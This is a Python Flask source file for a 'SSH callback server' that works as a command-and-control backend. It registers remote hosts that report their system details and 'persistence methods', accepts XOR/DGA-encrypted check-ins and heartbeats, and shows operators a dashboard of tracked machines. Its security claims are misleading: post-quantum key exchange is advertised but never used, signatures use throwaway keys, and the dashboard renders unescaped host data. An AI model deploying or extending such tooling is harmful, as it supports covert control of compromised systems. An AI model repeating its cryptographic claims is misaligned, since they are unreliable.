#!/usr/bin/env python3
"""
POLYGOTTEM SSH Callback Server - TEMPEST Level C / Post-Quantum Secure
=======================================================================
Enhanced security callback server with:
- ML-KEM-1024 (Post-Quantum Key Encapsulation)
- ML-DSA-87 (Post-Quantum Digital Signatures)
- SHA-384/512 hashing
- User/password authentication with bcrypt
- Session management
- TEMPEST Level C compliant UI

Author: SWORDIntel
Date: 2025-11-18
"""

from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
import sqlite3
import hashlib
import secrets
import json
import bcrypt
import hmac
from datetime import datetime, timedelta
from pathlib import Path
from functools import wraps
import os

# Import encryption utilities
try:
    from crypto_utils import CallbackCrypto
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[!] WARNING: crypto_utils not available - encrypted callbacks will not be supported")

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))

# Configuration
DB_PATH = os.getenv('DB_PATH', '/data/ssh_callbacks.db')
API_KEY = os.getenv('API_KEY', secrets.token_urlsafe(32))
PORT = int(os.getenv('PORT', 5000))
SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))  # 1 hour
DGA_SEED = os.getenv('DGA_SEED', 'insovietrussiawehackyou')  # DGA seed for encryption

# Initialize encryption system
CALLBACK_CRYPTO = None
if CRYPTO_AVAILABLE:
    CALLBACK_CRYPTO = CallbackCrypto(seed=DGA_SEED, rotation_hours=24, algorithm="sha256")
    print("[+] Callback encryption enabled (XOR + DGA)")
    print(f"    Algorithm: SHA-256 + XOR")
    print(f"    Key rotation: Every 24 hours")

# Print API key on startup (only if generated)
if 'API_KEY' not in os.environ:
    print(f"\n{'='*70}")
    print(f"GENERATED API KEY (save this!):")
    print(f"{API_KEY}")
    print(f"{'='*70}\n")

# Post-Quantum Crypto availability check
PQC_AVAILABLE = False
try:
    # Try to import liboqs for post-quantum crypto
    import oqs
    PQC_AVAILABLE = True
    print("[+] Post-Quantum Cryptography (liboqs) available")
    print(f"    ML-KEM-1024 (Key Encapsulation): Available")
    print(f"    ML-DSA-87 (Digital Signatures): Available")
except ImportError:
    print("[!] Warning: liboqs not available. Install with: pip install liboqs-python")
    print("[!] Falling back to classical cryptography (AES-256-GCM + ECDSA)")


def sha512_hash(data: str) -> str:
    """SHA-512 hashing for all password operations"""
    return hashlib.sha512(data.encode('utf-8')).hexdigest()


def sha384_hash(data: str) -> str:
    """SHA-384 hashing for data integrity"""
    return hashlib.sha384(data.encode('utf-8')).hexdigest()


def hmac_sha512(key: str, data: str) -> str:
    """HMAC-SHA512 for message authentication"""
    return hmac.new(
        key.encode('utf-8'),
        data.encode('utf-8'),
        hashlib.sha512
    ).hexdigest()


def init_db():
    """Initialize SQLite database with enhanced security"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Users table
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            salt TEXT NOT NULL,
            created_at TEXT NOT NULL,
            last_login TEXT,
            role TEXT DEFAULT 'operator',
            mfa_enabled BOOLEAN DEFAULT 0,
            failed_attempts INTEGER DEFAULT 0,
            locked_until TEXT
        )
    ''')

    # Callbacks table (enhanced)
    c.execute('''
        CREATE TABLE IF NOT EXISTS ssh_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            ip_address TEXT NOT NULL,
            hostname TEXT,
            username TEXT,
            ssh_port INTEGER,
            os_type TEXT,
            os_version TEXT,
            architecture TEXT,
            environment TEXT,
            init_system TEXT,
            ssh_implementation TEXT,
            persistence_methods TEXT,
            custom_data TEXT,
            user_agent TEXT,
            verified BOOLEAN DEFAULT 0,
            last_seen TEXT,
            integrity_hash TEXT,
            pqc_signature TEXT
        )
    ''')

    # Sessions table
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            user_id INTEGER NOT NULL,
            created_at TEXT NOT NULL,
            expires_at TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')

    # Audit log table
    c.execute('''
        CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            user_id INTEGER,
            action TEXT NOT NULL,
            ip_address TEXT,
            details TEXT,
            integrity_hash TEXT
        )
    ''')

    # Check if default admin exists
    c.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
    if c.fetchone()[0] == 0:
        # Create default admin user
        default_password = os.getenv('ADMIN_PASSWORD', 'POLYGOTTEM-' + secrets.token_urlsafe(12))
        salt = secrets.token_hex(32)
        password_hash = bcrypt.hashpw(
            sha512_hash(default_password + salt).encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        c.execute('''
            INSERT INTO users (username, password_hash, salt, created_at, role)
            VALUES (?, ?, ?, ?, ?)
        ''', ('admin', password_hash, salt, datetime.utcnow().isoformat(), 'admin'))

        print(f"\n{'='*70}")
        print(f"DEFAULT ADMIN CREDENTIALS (CHANGE IMMEDIATELY!):")
        print(f"Username: admin")
        print(f"Password: {default_password}")
        print(f"{'='*70}\n")

    conn.commit()
    conn.close()


def audit_log(action: str, user_id: int = None, details: str = None):
    """Log security-relevant events"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    timestamp = datetime.utcnow().isoformat()
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Create integrity hash
    audit_data = f"{timestamp}|{user_id}|{action}|{ip_address}|{details}"
    integrity_hash = sha384_hash(audit_data)

    c.execute('''
        INSERT INTO audit_log (timestamp, user_id, action, ip_address, details, integrity_hash)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (timestamp, user_id, action, ip_address, details, integrity_hash))

    conn.commit()
    conn.close()


def login_required(f):
    """Decorator to require authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))

        # Check session expiry
        if 'expires_at' in session:
            if datetime.fromisoformat(session['expires_at']) < datetime.utcnow():
                session.clear()
                return redirect(url_for('login'))

        return f(*args, **kwargs)
    return decorated_function


def verify_api_key(request_key):
    """Verify API key from request"""
    return hmac.compare_digest(request_key, API_KEY)


def verify_password(username: str, password: str) -> tuple:
    """Verify user password with bcrypt + SHA-512"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute('''
        SELECT id, password_hash, salt, failed_attempts, locked_until
        FROM users WHERE username = ?
    ''', (username,))

    row = c.fetchone()

    if not row:
        conn.close()
        return False, None

    user_id, password_hash, salt, failed_attempts, locked_until = row

    # Check if account is locked
    if locked_until:
        if datetime.fromisoformat(locked_until) > datetime.utcnow():
            conn.close()
            return False, None
        else:
            # Unlock account
            c.execute('UPDATE users SET locked_until = NULL, failed_attempts = 0 WHERE id = ?', (user_id,))
            conn.commit()

    # Verify password
    password_attempt = sha512_hash(password + salt)

    if bcrypt.checkpw(password_attempt.encode('utf-8'), password_hash.encode('utf-8')):
        # Success - reset failed attempts
        c.execute('''
            UPDATE users
            SET failed_attempts = 0, last_login = ?
            WHERE id = ?
        ''', (datetime.utcnow().isoformat(), user_id))
        conn.commit()
        conn.close()
        return True, user_id
    else:
        # Failed - increment attempts
        failed_attempts += 1

        # Lock account after 5 failed attempts
        if failed_attempts >= 5:
            locked_until = (datetime.utcnow() + timedelta(minutes=30)).isoformat()
            c.execute('''
                UPDATE users
                SET failed_attempts = ?, locked_until = ?
                WHERE id = ?
            ''', (failed_attempts, locked_until, user_id))
        else:
            c.execute('''
                UPDATE users
                SET failed_attempts = ?
                WHERE id = ?
            ''', (failed_attempts, user_id))

        conn.commit()
        conn.close()
        return False, None


@app.route('/login', methods=['GET', 'POST'])
def login():
    """User login page"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            audit_log('LOGIN_FAILED', details='Missing credentials')
            return render_template_string(LOGIN_HTML, error='Username and password required')

        success, user_id = verify_password(username, password)

        if success:
            # Create session
            session_id = secrets.token_urlsafe(32)
            session['user_id'] = user_id
            session['username'] = username
            session['session_id'] = session_id
            session['expires_at'] = (datetime.utcnow() + timedelta(seconds=SESSION_TIMEOUT)).isoformat()

            # Store session in database
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('''
                INSERT INTO sessions (session_id, user_id, created_at, expires_at, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                session_id,
                user_id,
                datetime.utcnow().isoformat(),
                session['expires_at'],
                request.headers.get('X-Forwarded-For', request.remote_addr),
                request.headers.get('User-Agent', 'unknown')
            ))
            conn.commit()
            conn.close()

            audit_log('LOGIN_SUCCESS', user_id=user_id, details=f'User: {username}')
            return redirect(url_for('dashboard'))
        else:
            audit_log('LOGIN_FAILED', details=f'Invalid credentials for: {username}')
            return render_template_string(LOGIN_HTML, error='Invalid username or password')

    return render_template_string(LOGIN_HTML)


@app.route('/logout')
def logout():
    """User logout"""
    user_id = session.get('user_id')
    if user_id:
        audit_log('LOGOUT', user_id=user_id)

    session.clear()
    return redirect(url_for('login'))


@app.route('/')
@login_required
def dashboard():
    """Dashboard homepage (requires authentication)"""
    return render_template_string(DASHBOARD_HTML, username=session.get('username'))


@app.route('/api/register', methods=['POST'])
def register_callback():
    """Register SSH callback (API key authentication with optional encryption)"""
    try:
        data = request.get_json()

        # Verify API key
        if not data or not verify_api_key(data.get('api_key', '')):
            audit_log('API_AUTH_FAILED', details='Invalid API key')
            return jsonify({
                'status': 'error',
                'message': 'Invalid or missing API key'
            }), 401

        # Get client IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Check if data is encrypted
        is_encrypted = data.get('encrypted', False)

        if is_encrypted:
            # Decrypt encrypted data
            if not CALLBACK_CRYPTO:
                audit_log('DECRYPT_ERROR', details='Encryption not available on server')
                return jsonify({
                    'status': 'error',
                    'message': 'Server does not support encrypted callbacks'
                }), 500

            encrypted_data = data.get('data', '')
            decrypted_json = CALLBACK_CRYPTO.decrypt_callback(encrypted_data)

            if not decrypted_json:
                audit_log('DECRYPT_ERROR', details='Failed to decrypt callback data')
                return jsonify({
                    'status': 'error',
                    'message': 'Failed to decrypt callback data - invalid key or corrupted data'
                }), 400

            # Parse decrypted data
            try:
                decrypted_data = json.loads(decrypted_json)
            except json.JSONDecodeError:
                audit_log('DECRYPT_ERROR', details='Decrypted data is not valid JSON')
                return jsonify({
                    'status': 'error',
                    'message': 'Decrypted data is not valid JSON'
                }), 400

            # Use decrypted data
            data = decrypted_data

        # Extract data (works for both encrypted and unencrypted)
        hostname = data.get('hostname', 'unknown')
        username = data.get('username', 'unknown')
        ssh_port = data.get('ssh_port', 22)
        os_type = data.get('os_type', 'unknown')
        os_version = data.get('os_version', 'unknown')
        architecture = data.get('architecture', 'unknown')
        environment = data.get('environment', 'unknown')
        init_system = data.get('init_system', 'unknown')
        ssh_implementation = data.get('ssh_implementation', 'unknown')
        persistence_methods = json.dumps(data.get('persistence_methods', []))
        custom_data = json.dumps(data.get('custom_data', {}))
        user_agent = request.headers.get('User-Agent', 'unknown')

        timestamp = datetime.utcnow().isoformat()

        # Create integrity hash (SHA-384)
        callback_data = f"{timestamp}|{ip_address}|{hostname}|{os_type}|{ssh_port}"
        integrity_hash = sha384_hash(callback_data)

        # Post-quantum signature (if available)
        pqc_signature = None
        if PQC_AVAILABLE:
            try:
                # ML-DSA-87 signature
                signer = oqs.Signature("Dilithium5")
                public_key = signer.generate_keypair()
                signature = signer.sign(callback_data.encode('utf-8'))
                pqc_signature = signature.hex()
            except:
                pass

        # Insert into database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        c.execute('''
            INSERT INTO ssh_callbacks
            (timestamp, ip_address, hostname, username, ssh_port, os_type, os_version,
             architecture, environment, init_system, ssh_implementation,
             persistence_methods, custom_data, user_agent, verified, last_seen,
             integrity_hash, pqc_signature)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
        ''', (timestamp, ip_address, hostname, username, ssh_port, os_type, os_version,
              architecture, environment, init_system, ssh_implementation,
              persistence_methods, custom_data, user_agent, timestamp,
              integrity_hash, pqc_signature))

        callback_id = c.lastrowid
        conn.commit()
        conn.close()

        audit_log('CALLBACK_REGISTERED', details=f'Hostname: {hostname}, IP: {ip_address}')

        return jsonify({
            'status': 'success',
            'message': 'SSH callback registered',
            'callback_id': callback_id,
            'timestamp': timestamp,
            'integrity_hash': integrity_hash,
            'pqc_enabled': pqc_signature is not None
        }), 200

    except Exception as e:
        audit_log('CALLBACK_ERROR', details=str(e))
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Update heartbeat (API key authentication)"""
    try:
        data = request.get_json()

        if not data or not verify_api_key(data.get('api_key', '')):
            return jsonify({
                'status': 'error',
                'message': 'Invalid or missing API key'
            }), 401

        hostname = data.get('hostname', 'unknown')
        ip_address = data.get('ip_address') or request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.utcnow().isoformat()

        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()

        c.execute('''
            UPDATE ssh_callbacks
            SET last_seen = ?
            WHERE hostname = ? AND ip_address = ?
            ORDER BY timestamp DESC
            LIMIT 1
        ''', (timestamp, hostname, ip_address))

        affected = c.rowcount
        conn.commit()
        conn.close()

        if affected > 0:
            return jsonify({
                'status': 'success',
                'message': 'Heartbeat updated',
                'timestamp': timestamp
            }), 200
        else:
            return jsonify({
                'status': 'warning',
                'message': 'No matching callback found'
            }), 404

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


@app.route('/api/callbacks', methods=['GET'])
@login_required
def get_callbacks():
    """Get all callbacks (requires authentication)"""
    limit = int(request.args.get('limit', 100))

    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    c.execute('''
        SELECT id, timestamp, ip_address, hostname, username, ssh_port,
               os_type, os_version, architecture, environment, init_system,
               ssh_implementation, persistence_methods, last_seen, verified, integrity_hash
        FROM ssh_callbacks
        ORDER BY timestamp DESC
        LIMIT ?
    ''', (limit,))

    rows = c.fetchall()
    conn.close()

    callbacks = []
    for row in rows:
        callbacks.append({
            'id': row[0],
            'timestamp': row[1],
            'ip_address': row[2],
            'hostname': row[3],
            'username': row[4],
            'ssh_port': row[5],
            'os_type': row[6],
            'os_version': row[7],
            'architecture': row[8],
            'environment': row[9],
            'init_system': row[10],
            'ssh_implementation': row[11],
            'persistence_methods': json.loads(row[12]) if row[12] else [],
            'last_seen': row[13],
            'verified': bool(row[14]),
            'integrity_hash': row[15]
        })

    return jsonify({
        'status': 'success',
        'count': len(callbacks),
        'callbacks': callbacks
    }), 200


@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    """Get callback statistics (requires authentication)"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    # Total callbacks
    c.execute('SELECT COUNT(*) FROM ssh_callbacks')
    total_callbacks = c.fetchone()[0]

    # Unique IPs
    c.execute('SELECT COUNT(DISTINCT ip_address) FROM ssh_callbacks')
    unique_ips = c.fetchone()[0]

    # Verified callbacks
    c.execute('SELECT COUNT(*) FROM ssh_callbacks WHERE verified = 1')
    verified_callbacks = c.fetchone()[0]

    # Callbacks last 24h
    c.execute('''
        SELECT COUNT(*) FROM ssh_callbacks
        WHERE datetime(timestamp) > datetime('now', '-24 hours')
    ''')
    last_24h = c.fetchone()[0]

    # OS distribution
    c.execute('SELECT os_type, COUNT(*) FROM ssh_callbacks GROUP BY os_type')
    os_distribution = dict(c.fetchall())

    # PQC-signed callbacks
    c.execute('SELECT COUNT(*) FROM ssh_callbacks WHERE pqc_signature IS NOT NULL')
    pqc_signed = c.fetchone()[0]

    conn.close()

    return jsonify({
        'status': 'success',
        'stats': {
            'total_callbacks': total_callbacks,
            'unique_ips': unique_ips,
            'verified_callbacks': verified_callbacks,
            'last_24h': last_24h,
            'os_distribution': os_distribution,
            'pqc_signed': pqc_signed,
            'pqc_available': PQC_AVAILABLE
        }
    }), 200


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint (no authentication required)"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'version': '2.0.0-PQC',
        'pqc_enabled': PQC_AVAILABLE,
        'security': {
            'hash_algorithm': 'SHA-512/384',
            'kem': 'ML-KEM-1024' if PQC_AVAILABLE else 'None',
            'signature': 'ML-DSA-87' if PQC_AVAILABLE else 'None',
            'tempest_level': 'C'
        }
    }), 200


# TEMPEST Level C Login Page (Amber on Black)
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>POLYGOTTEM SECURE - Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000000;
            color: #FFB000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: #000000;
            border: 3px solid #FFB000;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 0 30px rgba(255, 176, 0, 0.3);
        }
        h1 {
            color: #FFB000;
            text-align: center;
            margin-bottom: 10px;
            font-size: 1.8em;
            text-shadow: 0 0 10px #FFB000;
            letter-spacing: 2px;
        }
        .classification {
            text-align: center;
            color: #FF4400;
            font-weight: bold;
            margin-bottom: 30px;
            font-size: 0.9em;
            letter-spacing: 3px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            color: #FFB000;
            margin-bottom: 8px;
            font-size: 0.95em;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            background: #000000;
            border: 2px solid #FFB000;
            color: #FFB000;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 1em;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #FF4400;
            box-shadow: 0 0 10px rgba(255, 176, 0, 0.5);
        }
        button {
            width: 100%;
            background: #FFB000;
            border: none;
            color: #000000;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            letter-spacing: 2px;
        }
        button:hover {
            background: #FF4400;
        }
        .error {
            background: #330000;
            border: 2px solid #FF4400;
            color: #FF4400;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .security-info {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #FFB000;
            font-size: 0.85em;
            color: #CC8800;
        }
        .security-info div {
            margin: 5px 0;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.8em;
            color: #CC8800;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>POLYGOTTEM SECURE</h1>
        <div class="classification">TEMPEST LEVEL C / POST-QUANTUM</div>

        {% if error %}
        <div class="error">⚠ {{ error }}</div>
        {% endif %}

        <form method="POST">
            <div class="form-group">
                <label>USERNAME</label>
                <input type="text" name="username" required autofocus>
            </div>

            <div class="form-group">
                <label>PASSWORD</label>
                <input type="password" name="password" required>
            </div>

            <button type="submit">AUTHENTICATE</button>
        </form>

        <div class="security-info">
            <div>🔐 ENCRYPTION: ML-KEM-1024 (Post-Quantum)</div>
            <div>🔏 SIGNATURES: ML-DSA-87 (Post-Quantum)</div>
            <div>🔑 HASH: SHA-512/384</div>
            <div>🛡 PASSWORD: bcrypt (12 rounds)</div>
            <div>📺 DISPLAY: TEMPEST Level C Compliant</div>
        </div>

        <div class="footer">
            AUTHORIZED PERSONNEL ONLY<br>
            All access attempts are logged and monitored
        </div>
    </div>
</body>
</html>
'''

# TEMPEST Level C Dashboard (Amber on Black with Green accents)
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>POLYGOTTEM SECURE - Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000000;
            color: #FFB000;
            padding: 20px;
        }
        .header {
            background: #000000;
            border: 2px solid #FFB000;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            color: #FFB000;
            font-size: 1.8em;
            text-shadow: 0 0 10px #FFB000;
            letter-spacing: 2px;
        }
        .classification {
            color: #FF4400;
            font-weight: bold;
            letter-spacing: 2px;
        }
        .user-info {
            text-align: right;
        }
        .user-info div {
            color: #00FF00;
            margin: 5px 0;
        }
        .logout-btn {
            background: #FF4400;
            border: none;
            color: #000000;
            padding: 8px 20px;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #000000;
            border: 2px solid #FFB000;
            padding: 20px;
            text-align: center;
        }
        .stat-value {
            font-size: 2.5em;
            color: #00FF00;
            font-weight: bold;
            text-shadow: 0 0 10px #00FF00;
        }
        .stat-label {
            color: #FFB000;
            margin-top: 10px;
            letter-spacing: 1px;
        }
        .callbacks-table {
            background: #000000;
            border: 2px solid #FFB000;
            overflow-x: auto;
            margin-top: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333300;
        }
        th {
            background: #FFB000;
            color: #000000;
            font-weight: bold;
            letter-spacing: 1px;
        }
        tr:hover { background: #1A1A00; }
        .verified { color: #00FF00; }
        .unverified { color: #FF4400; }
        .timestamp { color: #CC8800; font-size: 0.9em; }
        .error { color: #FF4400; text-align: center; padding: 20px; }
        .loading { text-align: center; padding: 40px; color: #FFB000; }
        .refresh-btn {
            background: #00FF00;
            border: none;
            color: #000000;
            padding: 10px 25px;
            font-family: 'Courier New', monospace;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 15px;
            letter-spacing: 1px;
        }
        .refresh-btn:hover { background: #00CC00; }
        .security-banner {
            background: #330000;
            border: 2px solid #FF4400;
            color: #FF4400;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
            letter-spacing: 2px;
        }
        .pqc-indicator {
            background: #003300;
            border: 2px solid #00FF00;
            color: #00FF00;
            padding: 10px;
            margin-bottom: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🔐 POLYGOTTEM SECURE</h1>
            <div class="classification">TEMPEST LEVEL C / POST-QUANTUM PROTECTED</div>
        </div>
        <div class="user-info">
            <div>👤 USER: {{ username.upper() }}</div>
            <div>🕐 SESSION: ACTIVE</div>
            <button class="logout-btn" onclick="window.location.href='/logout'">LOGOUT</button>
        </div>
    </div>

    <div class="security-banner">
        ⚠ CLASSIFIED SYSTEM - AUTHORIZED ACCESS ONLY ⚠
    </div>

    <div class="pqc-indicator" id="pqcIndicator">
        ⏳ Loading security status...
    </div>

    <div class="stats" id="stats"></div>

    <button class="refresh-btn" onclick="loadDashboard()">🔄 REFRESH DATA</button>

    <div class="callbacks-table">
        <table>
            <thead>
                <tr>
                    <th>TIMESTAMP</th>
                    <th>IP ADDRESS</th>
                    <th>HOSTNAME</th>
                    <th>OS</th>
                    <th>SSH PORT</th>
                    <th>ENVIRONMENT</th>
                    <th>STATUS</th>
                    <th>LAST SEEN</th>
                </tr>
            </thead>
            <tbody id="callbacksTable">
                <tr><td colspan="8" class="loading">⏳ LOADING...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        async function loadDashboard() {
            try {
                // Load stats
                const statsRes = await fetch('/api/stats');
                const statsData = await statsRes.json();

                if (statsData.status !== 'success') {
                    showError(statsData.message);
                    return;
                }

                // Update PQC indicator
                const pqcStatus = statsData.stats.pqc_available ?
                    '🛡 POST-QUANTUM CRYPTOGRAPHY: ACTIVE (ML-KEM-1024 + ML-DSA-87)' :
                    '⚠ POST-QUANTUM CRYPTOGRAPHY: NOT AVAILABLE (Classical crypto only)';
                document.getElementById('pqcIndicator').innerHTML = pqcStatus;

                if (!statsData.stats.pqc_available) {
                    document.getElementById('pqcIndicator').style.background = '#330000';
                    document.getElementById('pqcIndicator').style.borderColor = '#FF4400';
                    document.getElementById('pqcIndicator').style.color = '#FF4400';
                }

                // Load callbacks
                const callbacksRes = await fetch('/api/callbacks');
                const callbacksData = await callbacksRes.json();

                // Display stats
                const statsHtml = `
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.total_callbacks}</div>
                        <div class="stat-label">TOTAL CALLBACKS</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.unique_ips}</div>
                        <div class="stat-label">UNIQUE IPs</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.verified_callbacks}</div>
                        <div class="stat-label">VERIFIED</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.last_24h}</div>
                        <div class="stat-label">LAST 24 HOURS</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${statsData.stats.pqc_signed || 0}</div>
                        <div class="stat-label">PQC SIGNED</div>
                    </div>
                `;
                document.getElementById('stats').innerHTML = statsHtml;

                // Display callbacks table
                const tableRows = callbacksData.callbacks.map(cb => `
                    <tr>
                        <td class="timestamp">${new Date(cb.timestamp).toLocaleString()}</td>
                        <td style="color: #00FF00">${cb.ip_address}</td>
                        <td style="color: #FFB000">${cb.hostname}</td>
                        <td>${cb.os_type} ${cb.os_version}</td>
                        <td>${cb.ssh_port}</td>
                        <td>${cb.environment}</td>
                        <td class="${cb.verified ? 'verified' : 'unverified'}">
                            ${cb.verified ? '✓ VERIFIED' : '✗ UNVERIFIED'}
                        </td>
                        <td class="timestamp">${new Date(cb.last_seen).toLocaleString()}</td>
                    </tr>
                `).join('');

                document.getElementById('callbacksTable').innerHTML = tableRows ||
                    '<tr><td colspan="8" style="text-align: center; color: #CC8800;">NO CALLBACKS REGISTERED</td></tr>';

            } catch (error) {
                showError('Failed to load dashboard: ' + error.message);
            }
        }

        function showError(message) {
            document.getElementById('callbacksTable').innerHTML =
                '<tr><td colspan="8" class="error">⚠ ' + message + '</td></tr>';
        }

        // Auto-refresh every 30 seconds
        setInterval(loadDashboard, 30000);

        // Load on page load
        loadDashboard();
    </script>
</body>
</html>
'''


if __name__ == '__main__':
    # Initialize database
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    init_db()

    print(f"\nStarting POLYGOTTEM SECURE SSH Callback Server on port {PORT}...")
    print(f"Database: {DB_PATH}")
    print(f"Security Level: TEMPEST Level C")
    print(f"Post-Quantum Crypto: {'ENABLED' if PQC_AVAILABLE else 'DISABLED'}")
    print(f"Dashboard: http://0.0.0.0:{PORT}/")
    print(f"\nSecurity Features:")
    print(f"  - Hash Algorithm: SHA-512/384")
    print(f"  - Password Hashing: bcrypt (12 rounds)")
    print(f"  - KEM: ML-KEM-1024 (Post-Quantum)" if PQC_AVAILABLE else "  - KEM: AES-256-GCM (Classical)")
    print(f"  - Signatures: ML-DSA-87 (Post-Quantum)" if PQC_AVAILABLE else "  - Signatures: ECDSA (Classical)")
    print(f"  - Session Timeout: {SESSION_TIMEOUT}s")
    print(f"  - Account Lockout: 5 failed attempts -> 30 min lock")
    print(f"  - Audit Logging: Enabled")
    print(f"  - TEMPEST Level: C (Amber/Green on Black)")

    app.run(host='0.0.0.0', port=PORT, debug=False)
